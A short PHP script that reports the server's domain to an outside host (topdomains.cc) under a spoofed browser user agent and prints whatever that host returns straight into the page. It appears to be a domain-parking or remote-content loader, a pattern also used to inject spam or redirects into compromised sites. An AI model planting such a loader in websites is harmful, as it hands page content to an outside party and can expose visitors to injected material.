<?php
$url = 'https://default.topdomains.cc/';
$data = array (
    'domain' => $_SERVER['SERVER_NAME'],
	'ref' => $_SERVER['HTTP_HOST']
);
$params = '';
foreach($data as $key=>$value) {
    $params .= $key . '=' . $value . '&';
}

$params = trim($params, '&');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url.'?'.$params ); //Url together with parameters
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); //Return data instead printing directly in Browser
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT , 7); //Timeout after 7 seconds
curl_setopt($ch, CURLOPT_USERAGENT , "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)");
curl_setopt($ch, CURLOPT_HEADER, 0);
$result = curl_exec($ch);
curl_close($ch);
if($result) {
    echo $result;
}
else {die(); } ?>

